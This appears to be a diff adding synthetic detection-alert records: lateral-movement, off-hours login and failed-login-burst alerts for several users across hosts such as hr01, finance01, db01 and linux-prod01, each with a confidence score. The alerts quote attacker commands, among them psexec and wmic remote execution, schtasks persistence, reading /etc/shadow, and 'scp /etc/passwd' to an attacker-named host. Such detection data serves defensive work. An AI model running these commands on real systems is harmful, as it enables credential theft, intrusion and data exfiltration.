+2025-11-13 19:16:22,zoya,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.23] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
+2025-11-13 19:16:22,zoya,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.23] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
+2025-11-13 19:16:22,zoya,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.23] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-14 01:10:00,emp012,ws-012,Failed login burst before success,Event 4625 [- | src=198.51.100.44] Failed logon attempt #1/4 on ws-012,0.85
+2025-11-14 01:10:15,emp012,ws-012,Failed login burst before success,Event 4625 [- | src=198.51.100.44] Failed logon attempt #2/4 on ws-012,0.85
+2025-11-14 01:10:30,emp012,ws-012,Failed login burst before success,Event 4625 [- | src=198.51.100.44] Failed logon attempt #3/4 on ws-012,0.85
+2025-11-14 01:10:45,emp012,ws-012,Failed login burst before success,Event 4625 [- | src=198.51.100.44] Failed logon attempt #4/4 on ws-012,0.85
+2025-11-14 01:11:10,emp012,ws-012,Login outside working hours,Event 4624 [explorer.exe | src=198.51.100.44] logon on ws-012 at 01:11:10 (outside 06:00-18:00),0.55
+2025-11-14 01:11:18,emp012,ws-012,Login outside working hours,Event 4624 [mstsc.exe | src=198.51.100.44] logon on ws-012 at 01:11:18 (outside 06:00-18:00),0.55
+2025-11-14 01:11:30,emp012,ws-012,Admin share access,Event 4688 [powershell.exe | src=198.51.100.44] cmd: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-14 01:11:30,emp012,ws-012,Remote process creation,Event 4688 [powershell.exe | src=198.51.100.44] on ws-012: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-14 01:12:00,emp012,hr01,Multiple hosts in short time,Event 4624 [- | src=10.0.10.22] hopped to hr01 (after ['ws-012']),0.75
+2025-11-14 01:12:00,emp012,hr01,Sensitive host access,Event 4624 [- | src=10.0.10.22] on hr01 (unauthorized host access),0.85
+2025-11-14 01:12:00,emp012,hr01,Login outside working hours,Event 4624 [- | src=10.0.10.22] logon on hr01 at 01:12:00 (outside 06:00-18:00),0.55
+2025-11-14 01:12:10,emp012,hr01,Admin share access,Event 5140 [- | src=10.0.10.22] cmd: \\hr01\C$,0.8
+2025-11-14 01:12:10,emp012,hr01,Sensitive host access,Event 5140 [- | src=10.0.10.22] on hr01 cmd: \\hr01\C$,0.85
+2025-11-14 01:12:12,emp012,hr01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.10.22] on hr01 cmd: rdp_session_50,0.85
+2025-11-14 01:12:12,emp012,hr01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.22] logon on hr01 at 01:12:12 (outside 06:00-18:00),0.55
+2025-11-14 01:12:20,emp012,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.10.22] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-14 01:12:20,emp012,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.22] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-14 01:12:20,emp012,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.22] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-14 01:12:22,emp012,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.22] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-14 01:12:22,emp012,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.22] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-14 01:12:22,emp012,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.10.22] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-14 01:12:30,emp012,hr01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.10.22] on hr01 cmd: schtasks /create /s hr01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-14 01:12:35,emp012,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.22] on hr01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-14 01:12:35,emp012,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.22] on hr01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-14 01:14:00,emp012,finance01,Multiple hosts in short time,"Event 4624 [- | src=10.0.10.22] hopped to finance01 (after ['hr01', 'ws-012'])",0.75
+2025-11-14 01:14:00,emp012,finance01,Sensitive host access,Event 4624 [- | src=10.0.10.22] on finance01 (unauthorized host access),0.85
+2025-11-14 01:14:00,emp012,finance01,Login outside working hours,Event 4624 [- | src=10.0.10.22] logon on finance01 at 01:14:00 (outside 06:00-18:00),0.55
+2025-11-14 01:14:10,emp012,finance01,Admin share access,Event 5140 [- | src=10.0.10.22] cmd: \\finance01\C$,0.8
+2025-11-14 01:14:10,emp012,finance01,Sensitive host access,Event 5140 [- | src=10.0.10.22] on finance01 cmd: \\finance01\C$,0.85
+2025-11-14 01:14:12,emp012,finance01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.10.22] on finance01 cmd: rdp_session_51,0.85
+2025-11-14 01:14:12,emp012,finance01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.22] logon on finance01 at 01:14:12 (outside 06:00-18:00),0.55
+2025-11-14 01:14:20,emp012,finance01,Remote process creation,Event 4688 [wmic.exe | src=10.0.10.22] on finance01: wmic /node:finance01 process call create powershell.exe,0.7
+2025-11-14 01:14:20,emp012,finance01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.10.22] on finance01 cmd: wmic /node:finance01 process call create powershell.exe,0.85
+2025-11-14 01:14:22,emp012,finance01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.10.22] on finance01 cmd: wmic /node:finance01 process call create powershell.exe,0.85
+2025-11-14 01:14:22,emp012,finance01,Remote process creation,Event 4688 [wmic.exe | src=10.0.10.22] on finance01: wmic /node:finance01 process call create powershell.exe,0.7
+2025-11-14 01:16:00,emp012,db01,Sensitive host access,Event 4624 [- | src=10.0.10.22] on db01 (unauthorized host access),0.85
+2025-11-14 01:16:00,emp012,db01,Login outside working hours,Event 4624 [- | src=10.0.10.22] logon on db01 at 01:16:00 (outside 06:00-18:00),0.55
+2025-11-14 01:16:00,emp012,db01,Multiple hosts in short time,"Event 4624 [- | src=10.0.10.22] hopped to db01 (after ['finance01', 'hr01', 'ws-012'])",0.75
+2025-11-14 01:16:10,emp012,db01,Sensitive host access,Event 5140 [- | src=10.0.10.22] on db01 cmd: \\db01\C$,0.85
+2025-11-14 01:16:10,emp012,db01,Admin share access,Event 5140 [- | src=10.0.10.22] cmd: \\db01\C$,0.8
+2025-11-14 01:16:12,emp012,db01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.10.22] on db01 cmd: rdp_session_52,0.85
+2025-11-14 01:16:12,emp012,db01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.22] logon on db01 at 01:16:12 (outside 06:00-18:00),0.55
+2025-11-14 01:16:20,emp012,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.22] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-14 01:16:20,emp012,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.10.22] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-14 01:16:20,emp012,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.22] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-14 01:16:22,emp012,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.22] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-14 01:16:22,emp012,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.10.22] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-14 01:16:22,emp012,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.22] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-14 22:10:00,omar,host003,Failed login burst before success,Event 4625 [- | src=172.16.8.99] Failed logon attempt #2/4 on host003,0.85
+2025-11-14 22:10:00,omar,linux-app03,Failed login burst before success,Event 4625 [sshd | src=172.16.8.99] Failed logon attempt #1/4 on linux-app03,0.85
+2025-11-14 22:10:15,omar,linux-app03,Failed login burst before success,Event 4625 [sshd | src=172.16.8.99] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-14 22:10:15,omar,host003,Failed login burst before success,Event 4625 [- | src=172.16.8.99] Failed logon attempt #4/4 on host003,0.85
+2025-11-14 22:10:30,omar,linux-app03,Failed login burst before success,Event 4625 [sshd | src=172.16.8.99] Failed logon attempt #1/4 on linux-app03,0.85
+2025-11-14 22:10:30,omar,host003,Failed login burst before success,Event 4625 [- | src=172.16.8.99] Failed logon attempt #2/4 on host003,0.85
+2025-11-14 22:10:45,omar,linux-app03,Failed login burst before success,Event 4625 [sshd | src=172.16.8.99] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-14 22:10:45,omar,host003,Failed login burst before success,Event 4625 [- | src=172.16.8.99] Failed logon attempt #4/4 on host003,0.85
+2025-11-14 22:11:10,omar,host003,Login outside working hours,Event 4624 [explorer.exe | src=172.16.8.99] logon on host003 at 22:11:10 (outside 06:00-18:00),0.55
+2025-11-14 22:11:18,omar,host003,Login outside working hours,Event 4624 [mstsc.exe | src=172.16.8.99] logon on host003 at 22:11:18 (outside 06:00-18:00),0.55
+2025-11-14 22:11:30,omar,host003,Remote process creation,Event 4688 [powershell.exe | src=172.16.8.99] on host003: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-14 22:11:30,omar,host003,Admin share access,Event 4688 [powershell.exe | src=172.16.8.99] cmd: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-14 22:12:00,omar,finance01,Sensitive host access,Event 4624 [- | src=10.0.0.12] on finance01 (unauthorized host access),0.85
+2025-11-14 22:12:00,omar,finance01,Login outside working hours,Event 4624 [- | src=10.0.0.12] logon on finance01 at 22:12:00 (outside 06:00-18:00),0.55
+2025-11-14 22:12:10,omar,finance01,Admin share access,Event 5140 [- | src=10.0.0.12] cmd: \\finance01\C$,0.8
+2025-11-14 22:12:10,omar,finance01,Sensitive host access,Event 5140 [- | src=10.0.0.12] on finance01 cmd: \\finance01\C$,0.85
+2025-11-14 22:12:12,omar,finance01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.12] on finance01 cmd: rdp_session_50,0.85
+2025-11-14 22:12:12,omar,finance01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.12] logon on finance01 at 22:12:12 (outside 06:00-18:00),0.55
+2025-11-14 22:12:20,omar,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.12] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-14 22:12:20,omar,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.12] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-14 22:12:20,omar,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.12] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-14 22:12:22,omar,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.12] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-14 22:12:22,omar,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.12] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-14 22:12:22,omar,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.12] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-14 22:12:30,omar,finance01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.12] on finance01 cmd: schtasks /create /s finance01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-14 22:12:35,omar,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.12] on finance01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-14 22:12:35,omar,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.12] on finance01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-14 22:14:00,omar,db01,Login outside working hours,Event 4624 [- | src=10.0.0.12] logon on db01 at 22:14:00 (outside 06:00-18:00),0.55
+2025-11-14 22:14:00,omar,db01,Multiple hosts in short time,Event 4624 [- | src=10.0.0.12] hopped to db01 (after ['finance01']),0.75
+2025-11-14 22:14:00,omar,db01,Sensitive host access,Event 4624 [- | src=10.0.0.12] on db01 (unauthorized host access),0.85
+2025-11-14 22:14:10,omar,db01,Admin share access,Event 5140 [- | src=10.0.0.12] cmd: \\db01\C$,0.8
+2025-11-14 22:14:10,omar,db01,Sensitive host access,Event 5140 [- | src=10.0.0.12] on db01 cmd: \\db01\C$,0.85
+2025-11-14 22:14:12,omar,db01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.12] logon on db01 at 22:14:12 (outside 06:00-18:00),0.55
+2025-11-14 22:14:12,omar,db01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.12] on db01 cmd: rdp_session_51,0.85
+2025-11-14 22:14:20,omar,db01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.12] on db01 cmd: wmic /node:db01 process call create powershell.exe,0.85
+2025-11-14 22:14:20,omar,db01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.12] on db01: wmic /node:db01 process call create powershell.exe,0.7
+2025-11-14 22:14:22,omar,db01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.12] on db01 cmd: wmic /node:db01 process call create powershell.exe,0.85
+2025-11-14 22:14:22,omar,db01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.12] on db01: wmic /node:db01 process call create powershell.exe,0.7
+2025-11-14 22:16:00,omar,linux-prod01,Sensitive host access,Event 4624 [sshd | src=10.0.0.12] on linux-prod01 (unauthorized host access),0.85
+2025-11-14 22:16:00,omar,linux-prod01,Multiple hosts in short time,"Event 4624 [sshd | src=10.0.0.12] hopped to linux-prod01 (after ['db01', 'finance01'])",0.75
+2025-11-14 22:16:00,omar,linux-prod01,Login outside working hours,Event 4624 [sshd | src=10.0.0.12] logon on linux-prod01 at 22:16:00 (outside 06:00-18:00),0.55
+2025-11-14 22:16:15,omar,linux-prod01,Remote process creation,Event 4688 [sudo | src=-] on linux-prod01: /usr/bin/cat /etc/shadow,0.7
+2025-11-14 22:16:15,omar,linux-prod01,Sensitive host access,Event 4688 [sudo | src=-] on linux-prod01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-14 22:16:25,omar,linux-prod01,Remote process creation,Event 4688 [scp | src=10.0.0.12] on linux-prod01: scp /etc/passwd attacker@172.16.8.99:/tmp/,0.7
+2025-11-14 22:16:25,omar,linux-prod01,Sensitive host access,Event 4688 [scp | src=10.0.0.12] on linux-prod01 cmd: scp /etc/passwd attacker@172.16.8.99:/tmp/,0.85
+2025-11-14 22:16:35,omar,linux-prod01,Remote process creation,Event 4688 [cron | src=-] on linux-prod01: /tmp/.persist.sh,0.7
+2025-11-14 22:16:35,omar,linux-prod01,Sensitive host access,Event 4688 [cron | src=-] on linux-prod01 cmd: /tmp/.persist.sh,0.85
+2025-11-15 04:10:00,emp077,ws-077,Failed login burst before success,Event 4625 [- | src=203.0.113.88] Failed logon attempt #2/4 on ws-077,0.85
+2025-11-15 04:10:00,emp077,linux-app03,Failed login burst before success,Event 4625 [sshd | src=203.0.113.88] Failed logon attempt #1/4 on linux-app03,0.85
+2025-11-15 04:10:15,emp077,ws-077,Failed login burst before success,Event 4625 [- | src=203.0.113.88] Failed logon attempt #4/4 on ws-077,0.85
+2025-11-15 04:10:15,emp077,linux-app03,Failed login burst before success,Event 4625 [sshd | src=203.0.113.88] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-15 04:10:30,emp077,ws-077,Failed login burst before success,Event 4625 [- | src=203.0.113.88] Failed logon attempt #2/4 on ws-077,0.85
+2025-11-15 04:10:30,emp077,linux-app03,Failed login burst before success,Event 4625 [sshd | src=203.0.113.88] Failed logon attempt #1/4 on linux-app03,0.85
+2025-11-15 04:10:45,emp077,linux-app03,Failed login burst before success,Event 4625 [sshd | src=203.0.113.88] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-15 04:10:45,emp077,ws-077,Failed login burst before success,Event 4625 [- | src=203.0.113.88] Failed logon attempt #4/4 on ws-077,0.85
+2025-11-15 04:11:10,emp077,ws-077,Login outside working hours,Event 4624 [explorer.exe | src=203.0.113.88] logon on ws-077 at 04:11:10 (outside 06:00-18:00),0.55
+2025-11-15 04:11:18,emp077,ws-077,Login outside working hours,Event 4624 [mstsc.exe | src=203.0.113.88] logon on ws-077 at 04:11:18 (outside 06:00-18:00),0.55
+2025-11-15 04:11:30,emp077,ws-077,Admin share access,Event 4688 [powershell.exe | src=203.0.113.88] cmd: Invoke-Command -ComputerName linux-prod01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-15 04:11:30,emp077,ws-077,Remote process creation,Event 4688 [powershell.exe | src=203.0.113.88] on ws-077: Invoke-Command -ComputerName linux-prod01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-15 04:12:00,emp077,linux-prod01,Login outside working hours,Event 4624 [sshd | src=10.0.10.87] logon on linux-prod01 at 04:12:00 (outside 06:00-18:00),0.55
+2025-11-15 04:12:00,emp077,linux-prod01,Sensitive host access,Event 4624 [sshd | src=10.0.10.87] on linux-prod01 (unauthorized host access),0.85
+2025-11-15 04:12:00,emp077,linux-prod01,Multiple hosts in short time,Event 4624 [sshd | src=10.0.10.87] hopped to linux-prod01 (after ['ws-077']),0.75
+2025-11-15 04:12:15,emp077,linux-prod01,Remote process creation,Event 4688 [sudo | src=-] on linux-prod01: /usr/bin/cat /etc/shadow,0.7
+2025-11-15 04:12:15,emp077,linux-prod01,Sensitive host access,Event 4688 [sudo | src=-] on linux-prod01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-15 04:12:25,emp077,linux-prod01,Sensitive host access,Event 4688 [scp | src=10.0.10.87] on linux-prod01 cmd: scp /etc/passwd attacker@203.0.113.88:/tmp/,0.85
+2025-11-15 04:12:25,emp077,linux-prod01,Remote process creation,Event 4688 [scp | src=10.0.10.87] on linux-prod01: scp /etc/passwd attacker@203.0.113.88:/tmp/,0.7
+2025-11-15 04:12:35,emp077,linux-prod01,Remote process creation,Event 4688 [cron | src=-] on linux-prod01: /tmp/.persist.sh,0.7
+2025-11-15 04:12:35,emp077,linux-prod01,Sensitive host access,Event 4688 [cron | src=-] on linux-prod01 cmd: /tmp/.persist.sh,0.85
+2025-11-15 04:14:00,emp077,linux-db01,Sensitive host access,Event 4624 [sshd | src=10.0.10.87] on linux-db01 (unauthorized host access),0.85
+2025-11-15 04:14:00,emp077,linux-db01,Multiple hosts in short time,"Event 4624 [sshd | src=10.0.10.87] hopped to linux-db01 (after ['linux-prod01', 'ws-077'])",0.75
+2025-11-15 04:14:00,emp077,linux-db01,Login outside working hours,Event 4624 [sshd | src=10.0.10.87] logon on linux-db01 at 04:14:00 (outside 06:00-18:00),0.55
+2025-11-15 04:14:15,emp077,linux-db01,Sensitive host access,Event 4688 [sudo | src=-] on linux-db01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-15 04:14:15,emp077,linux-db01,Remote process creation,Event 4688 [sudo | src=-] on linux-db01: /usr/bin/cat /etc/shadow,0.7
+2025-11-15 04:14:25,emp077,linux-db01,Sensitive host access,Event 4688 [scp | src=10.0.10.87] on linux-db01 cmd: scp /etc/passwd attacker@203.0.113.88:/tmp/,0.85
+2025-11-15 04:14:25,emp077,linux-db01,Remote process creation,Event 4688 [scp | src=10.0.10.87] on linux-db01: scp /etc/passwd attacker@203.0.113.88:/tmp/,0.7
+2025-11-15 04:14:35,emp077,linux-db01,Sensitive host access,Event 4688 [cron | src=-] on linux-db01 cmd: /tmp/.persist.sh,0.85
+2025-11-15 04:14:35,emp077,linux-db01,Remote process creation,Event 4688 [cron | src=-] on linux-db01: /tmp/.persist.sh,0.7
+2025-11-15 11:10:00,bilal,host005,Failed login burst before success,Event 4625 [- | src=10.0.0.19] Failed logon attempt #1/4 on host005,0.85
+2025-11-15 11:10:15,bilal,host005,Failed login burst before success,Event 4625 [- | src=10.0.0.19] Failed logon attempt #2/4 on host005,0.85
+2025-11-15 11:10:30,bilal,host005,Failed login burst before success,Event 4625 [- | src=10.0.0.19] Failed logon attempt #3/4 on host005,0.85
+2025-11-15 11:10:45,bilal,host005,Failed login burst before success,Event 4625 [- | src=10.0.0.19] Failed logon attempt #4/4 on host005,0.85
+2025-11-15 11:11:30,bilal,host005,Remote process creation,Event 4688 [powershell.exe | src=10.0.0.19] on host005: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-15 11:11:30,bilal,host005,Admin share access,Event 4688 [powershell.exe | src=10.0.0.19] cmd: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-15 11:12:00,bilal,hr01,Multiple hosts in short time,Event 4624 [- | src=10.0.0.19] hopped to hr01 (after ['host005']),0.75
+2025-11-15 11:12:00,bilal,hr01,Sensitive host access,Event 4624 [- | src=10.0.0.19] on hr01 (unauthorized host access),0.85
+2025-11-15 11:12:10,bilal,hr01,Sensitive host access,Event 5140 [- | src=10.0.0.19] on hr01 cmd: \\hr01\C$,0.85
+2025-11-15 11:12:10,bilal,hr01,Admin share access,Event 5140 [- | src=10.0.0.19] cmd: \\hr01\C$,0.8
+2025-11-15 11:12:12,bilal,hr01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.19] on hr01 cmd: rdp_session_50,0.85
+2025-11-15 11:12:20,bilal,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.19] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-15 11:12:20,bilal,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.19] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-15 11:12:20,bilal,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.19] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-15 11:12:22,bilal,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.19] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-15 11:12:22,bilal,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.19] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-15 11:12:22,bilal,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.19] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-15 11:12:30,bilal,hr01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.19] on hr01 cmd: schtasks /create /s hr01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-15 11:12:35,bilal,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.19] on hr01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-15 11:12:35,bilal,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.19] on hr01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-15 11:14:00,bilal,dc01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.19] hopped to dc01 (after ['host005', 'hr01'])",0.75
+2025-11-15 11:14:00,bilal,dc01,Sensitive host access,Event 4624 [- | src=10.0.0.19] on dc01 (unauthorized host access),0.85
+2025-11-15 11:14:10,bilal,dc01,Admin share access,Event 5140 [- | src=10.0.0.19] cmd: \\dc01\C$,0.8
+2025-11-15 11:14:10,bilal,dc01,Sensitive host access,Event 5140 [- | src=10.0.0.19] on dc01 cmd: \\dc01\C$,0.85
+2025-11-15 11:14:12,bilal,dc01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.19] on dc01 cmd: rdp_session_51,0.85
+2025-11-15 11:14:20,bilal,dc01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.19] on dc01 cmd: wmic /node:dc01 process call create powershell.exe,0.85
+2025-11-15 11:14:20,bilal,dc01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.19] on dc01: wmic /node:dc01 process call create powershell.exe,0.7
+2025-11-15 11:14:22,bilal,dc01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.19] on dc01 cmd: wmic /node:dc01 process call create powershell.exe,0.85
+2025-11-15 11:14:22,bilal,dc01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.19] on dc01: wmic /node:dc01 process call create powershell.exe,0.7
+2025-11-15 23:10:00,emp045,linux-app03,Failed login burst before success,Event 4625 [sshd | src=10.0.10.55] Failed logon attempt #2/4 on linux-app03,0.85
+2025-11-15 23:10:00,emp045,ws-045,Failed login burst before success,Event 4625 [- | src=10.0.10.55] Failed logon attempt #1/4 on ws-045,0.85
+2025-11-15 23:10:15,emp045,linux-app03,Failed login burst before success,Event 4625 [sshd | src=10.0.10.55] Failed logon attempt #4/4 on linux-app03,0.85
+2025-11-15 23:10:15,emp045,ws-045,Failed login burst before success,Event 4625 [- | src=10.0.10.55] Failed logon attempt #3/4 on ws-045,0.85
+2025-11-15 23:10:30,emp045,ws-045,Failed login burst before success,Event 4625 [- | src=10.0.10.55] Failed logon attempt #2/4 on ws-045,0.85
+2025-11-15 23:10:30,emp045,linux-app03,Failed login burst before success,Event 4625 [sshd | src=10.0.10.55] Failed logon attempt #1/4 on linux-app03,0.85
+2025-11-15 23:10:45,emp045,linux-app03,Failed login burst before success,Event 4625 [sshd | src=10.0.10.55] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-15 23:10:45,emp045,ws-045,Failed login burst before success,Event 4625 [- | src=10.0.10.55] Failed logon attempt #4/4 on ws-045,0.85
+2025-11-15 23:11:10,emp045,ws-045,Login outside working hours,Event 4624 [explorer.exe | src=10.0.10.55] logon on ws-045 at 23:11:10 (outside 06:00-18:00),0.55
+2025-11-15 23:11:18,emp045,ws-045,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.55] logon on ws-045 at 23:11:18 (outside 06:00-18:00),0.55
+2025-11-15 23:11:30,emp045,ws-045,Admin share access,Event 4688 [powershell.exe | src=10.0.10.55] cmd: Invoke-Command -ComputerName finance02 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-15 23:11:30,emp045,ws-045,Remote process creation,Event 4688 [powershell.exe | src=10.0.10.55] on ws-045: Invoke-Command -ComputerName finance02 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-15 23:12:00,emp045,finance02,Login outside working hours,Event 4624 [- | src=10.0.10.55] logon on finance02 at 23:12:00 (outside 06:00-18:00),0.55
+2025-11-15 23:12:00,emp045,finance02,Sensitive host access,Event 4624 [- | src=10.0.10.55] on finance02 (unauthorized host access),0.85
+2025-11-15 23:12:10,emp045,finance02,Admin share access,Event 5140 [- | src=10.0.10.55] cmd: \\finance02\C$,0.8
+2025-11-15 23:12:10,emp045,finance02,Sensitive host access,Event 5140 [- | src=10.0.10.55] on finance02 cmd: \\finance02\C$,0.85
+2025-11-15 23:12:12,emp045,finance02,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.55] logon on finance02 at 23:12:12 (outside 06:00-18:00),0.55
+2025-11-15 23:12:12,emp045,finance02,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.10.55] on finance02 cmd: rdp_session_50,0.85
+2025-11-15 23:12:20,emp045,finance02,Admin share access,Event 4688 [psexec.exe | src=10.0.10.55] cmd: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.8
+2025-11-15 23:12:20,emp045,finance02,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.55] on finance02 cmd: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.85
+2025-11-15 23:12:20,emp045,finance02,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.55] on finance02: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.7
+2025-11-15 23:12:22,emp045,finance02,Admin share access,Event 4688 [psexec.exe | src=10.0.10.55] cmd: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.8
